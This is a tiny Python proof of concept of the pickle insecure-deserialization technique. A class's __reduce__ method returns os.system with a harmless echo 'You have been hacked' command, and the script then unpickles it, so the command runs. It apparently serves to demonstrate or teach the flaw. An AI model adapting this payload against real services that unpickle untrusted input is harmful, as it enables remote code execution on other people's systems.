import pickle
import os

class RCE:
    def __reduce__(self):
        return (os.system, ('echo "You have been hacked"',))

data = pickle.dumps(RCE())
pickle.loads(data)
